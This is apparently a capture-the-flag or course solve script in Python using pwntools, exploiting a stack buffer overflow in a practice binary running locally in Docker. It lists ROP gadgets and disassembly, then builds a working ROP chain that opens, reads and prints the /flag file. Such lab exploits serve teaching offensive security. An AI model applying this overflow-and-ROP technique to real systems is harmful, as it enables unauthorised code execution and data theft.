#!/usr/bin/env python3

import pwn
import socket
import threading

# docker compose -f debug.yml up
# python3 ./solve.py
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/debug/practice-2')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

pwn.context.arch = 'amd64'

exe = pwn.ELF("./vuln")

port = 1024
conn = pwn.remote('127.0.0.1', port)

# wait for user input (in this time, connect gdb)
pwn.pause()

# we got 0x40 buffer on stack (64 bytes)
# we are doing syscall 0 (read) with rdx 0xFFF
# that means we can write up to 65535 bytes into our 64 byte stack buffer

# then we return, so imple rop chain

# ropper finds the following gadgets:
"""
0x000000000040102e: add byte ptr [rax - 0x39], cl; mov dword ptr [rax], 0x48000000; lea esi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401035: add byte ptr [rax - 0x73], cl; jne 0xffa; mov rdx, 0xffff; syscall; 
0x0000000000401035: add byte ptr [rax - 0x73], cl; jne 0xffa; mov rdx, 0xffff; syscall; leave; ret; 
0x000000000040102c: add byte ptr [rax], al; add byte ptr [rax - 0x39], cl; mov dword ptr [rax], 0x48000000; lea esi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401033: add byte ptr [rax], al; add byte ptr [rax - 0x73], cl; jne 0xffa; mov rdx, 0xffff; syscall; 
0x0000000000401032: add byte ptr [rax], al; add byte ptr [rax], al; lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x000000000040102b: add byte ptr [rax], al; add byte ptr [rax], al; mov rdi, 0; lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401034: add byte ptr [rax], al; lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401034: add byte ptr [rax], al; lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; leave; ret; 
0x0000000000401012: add byte ptr [rax], al; mov rax, 0x3c; xor rdi, rdi; syscall; 
0x000000000040102d: add byte ptr [rax], al; mov rdi, 0; lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401019: add byte ptr [rax], al; xor rdi, rdi; syscall; 
0x000000000040103f: add byte ptr [rax], al; syscall; 
0x000000000040103f: add byte ptr [rax], al; syscall; leave; ret; 
0x000000000040100f: call 0x1020; mov rax, 0x3c; xor rdi, rdi; syscall; 
0x0000000000401017: cmp al, 0; add byte ptr [rax], al; xor rdi, rdi; syscall; 
0x0000000000401026: in al, dx; mov rax, 0; mov rdi, 0; lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401038: jne 0xffa; mov rdx, 0xffff; syscall; 
0x0000000000401038: jne 0xffa; mov rdx, 0xffff; syscall; leave; ret; 
0x0000000000401037: lea esi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401037: lea esi, [rbp - 0x40]; mov rdx, 0xffff; syscall; leave; ret; 
0x0000000000401036: lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401036: lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; leave; ret; 
0x0000000000401031: mov dword ptr [rax], 0x48000000; lea esi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401029: mov eax, 0; mov rdi, 0; lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401015: mov eax, 0x3c; xor rdi, rdi; syscall; 
0x0000000000401030: mov edi, 0; lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401001: mov edi, eax; ret; 
0x000000000040103b: mov edx, 0xffff; syscall; 
0x000000000040103b: mov edx, 0xffff; syscall; leave; ret; 
0x0000000000401028: mov rax, 0; mov rdi, 0; lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401014: mov rax, 0x3c; xor rdi, rdi; syscall; 
0x000000000040102f: mov rdi, 0; lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401000: mov rdi, rax; ret; 
0x000000000040103a: mov rdx, 0xffff; syscall; 
0x000000000040103a: mov rdx, 0xffff; syscall; leave; ret; 
0x0000000000401010: or al, 0; add byte ptr [rax], al; mov rax, 0x3c; xor rdi, rdi; syscall; 
0x0000000000401009: pop rax; ret; 
0x0000000000401004: pop rdi; ret; 
0x000000000040100d: pop rdx; ret; 
0x000000000040100b: pop rsi; ret; 
0x000000000040103c: ret 0xffff; 
0x000000000040102a: rol byte ptr [rax], 0; add byte ptr [rax], al; mov rdi, 0; lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401025: sub esp, 0x40; mov rax, 0; mov rdi, 0; lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x0000000000401024: sub rsp, 0x40; mov rax, 0; mov rdi, 0; lea rsi, [rbp - 0x40]; mov rdx, 0xffff; syscall; 
0x000000000040101c: xor edi, edi; syscall; 
0x000000000040101b: xor rdi, rdi; syscall; 
0x0000000000401043: leave; ret; 
0x0000000000401003: ret; 
0x0000000000401006: syscall; 
0x0000000000401041: syscall; leave; ret; 
0x0000000000401006: syscall; ret; 
"""

# objdump -M intel -D ./vuln
"""
0000000000401000 <mov_rdi_rax_ret>:
  401000:	48 89 c7             	mov    rdi,rax
  401003:	c3                   	ret

0000000000401004 <pop_rdi_ret>:
  401004:	5f                   	pop    rdi
  401005:	c3                   	ret

0000000000401006 <do_syscall>:
  401006:	0f 05                	syscall
  401008:	c3                   	ret

0000000000401009 <pop_rax_ret>:
  401009:	58                   	pop    rax
  40100a:	c3                   	ret

000000000040100b <pop_rsi_ret>:
  40100b:	5e                   	pop    rsi
  40100c:	c3                   	ret

000000000040100d <pop_rdx_ret>:
  40100d:	5a                   	pop    rdx
  40100e:	c3                   	ret

000000000040100f <_start>:
  40100f:	e8 0c 00 00 00       	call   401020 <read_input>
  401014:	48 c7 c0 3c 00 00 00 	mov    rax,0x3c
  40101b:	48 31 ff             	xor    rdi,rdi
  40101e:	0f 05                	syscall

0000000000401020 <read_input>:
  401020:	55                   	push   rbp
  401021:	48 89 e5             	mov    rbp,rsp
  401024:	48 83 ec 40          	sub    rsp,0x40
  401028:	48 c7 c0 00 00 00 00 	mov    rax,0x0
  40102f:	48 c7 c7 00 00 00 00 	mov    rdi,0x0
  401036:	48 8d 75 c0          	lea    rsi,[rbp-0x40]
  40103a:	48 c7 c2 ff ff 00 00 	mov    rdx,0xffff
  401041:	0f 05                	syscall
  401043:	c9                   	leave
  401044:	c3                   	ret

Disassembly of section .data:

0000000000402000 <flag_file>:
  402000:	2f                   	(bad)
  402001:	66 6c                	data16 ins BYTE PTR es:[rdi],dx
  402003:	61                   	(bad)
  402004:	67 00 00             	add    BYTE PTR [eax],al
	...

0000000000402008 <flag_buffer>:
"""

#0000000000402000 <flag_file>:
#0000000000402008 <flag_buffer>:

# we have fd in rax, and read takes fd un rdi and writes into buffer
# we cannot use sendfile as we cannot write fd into rsi (simply no gadgets)
#0x0000000000401000: mov rdi, rax; ret;

address_pop_rax_ret = 0x0000000000401009
address_pop_rdi_ret = 0x0000000000401004
address_pop_rsi_ret = 0x000000000040100b
address_pop_rdx_ret = 0x000000000040100d

address_syscall_ret = 0x0000000000401006
address_rdi_rax_ret = 0x0000000000401000

# 1) open file (sycall 2)
# 2) write file into buffer (syscall 0)
# 3) write file to stdout

# we want to print the flag, so do: 
''''
    # fd_flag = open("/flag", O_RDONLY)
    mov rdi, <address of flag_file>;
    mov rsi, 0;
    mov rax, 2;
    syscall;

    # read fd_flag into flag_buffer
    mov rdi, rax;
    mov rax, 0;
    mov rsi, <address of flag_buffer>;
    mov rdx, 100;       
    syscall;

    # write flag_buffer to stdout
    mov rax, 1;
    mov rdi, 1;
    mov rsi, <address of flag_buffer>;
    mov rdx, 100;
    syscall;
                             
    ret;
string:
    .string "/flag"
'''

rop_chain = [
  # padding
  b'A'*64,
  b'B'*8,
  # open file /flag
  pwn.p64(address_pop_rax_ret),
  pwn.p64(2),
  pwn.p64(address_pop_rdi_ret),
  pwn.p64(0x402000),
  pwn.p64(address_pop_rsi_ret),
  pwn.p64(0),
  pwn.p64(address_syscall_ret),

  # read content of file into flag buffer
  pwn.p64(address_rdi_rax_ret),
  pwn.p64(address_pop_rax_ret),
  pwn.p64(0),
  pwn.p64(address_pop_rsi_ret),
  pwn.p64(0x0000000000402008), # the flag buffer
  pwn.p64(address_pop_rdx_ret),
  pwn.p64(100),
  pwn.p64(address_syscall_ret),

  # write flag buffer to output
  pwn.p64(address_pop_rax_ret),
  pwn.p64(1),
  pwn.p64(address_pop_rdi_ret),
  pwn.p64(1),
  pwn.p64(address_pop_rsi_ret),
  pwn.p64(0x0000000000402008), # the flag buffer
  pwn.p64(address_pop_rdx_ret),
  pwn.p64(100),
  pwn.p64(address_syscall_ret)
]

rop_chain = b''.join(gadget for gadget in rop_chain)

conn.sendline(rop_chain)

conn.interactive()
